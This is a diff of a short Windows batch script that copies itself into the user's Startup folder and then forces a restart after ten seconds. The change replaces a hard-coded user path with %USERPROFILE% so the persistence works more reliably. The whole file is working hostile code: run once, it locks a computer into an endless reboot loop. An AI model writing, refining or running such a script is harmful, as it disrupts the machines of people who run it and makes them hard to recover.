@@ -1,3 +1,3 @@
 @echo off
-copy batus.bat C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup
+copy batus.bat %USERPROFILE%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup
 shutdown /r /t 10
